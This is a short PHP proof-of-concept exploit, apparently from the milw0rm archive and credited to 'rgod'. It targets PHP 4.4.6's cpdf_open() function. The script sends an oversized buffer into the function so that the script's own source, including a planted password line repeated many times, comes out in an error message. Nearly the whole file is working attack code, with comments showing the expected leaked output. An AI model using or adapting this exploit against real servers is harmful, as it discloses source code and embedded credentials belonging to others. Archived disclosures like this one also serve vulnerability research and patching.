<?php
   /*
   PHP 4.4.6 cpdf_open() source code disclosure poc
   by rgod
   site: http://retrogod.altervista.org

   to be launched form the cli

   this will show as output something like this:

   ClibPDF: Cannot open [A * 11111]$my_password_is="suntzu";[newline]
   $my_password_is="suntzu";[etc...] for PDF output
   X-Powered-By: PHP/4.4.6
   Content-type: text/html

   I don't see some echo, and you? :)
   */

   if (!extension_loaded("pdf")){
       die("you need the pdf extension loaded.");
   }
   $____buff=str_repeat('A',1111);

   $p=cpdf_open(1,$____buff);

   //some code with some information
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";
   $my_password_is="suntzu";

?>

# milw0rm.com [2007-03-09]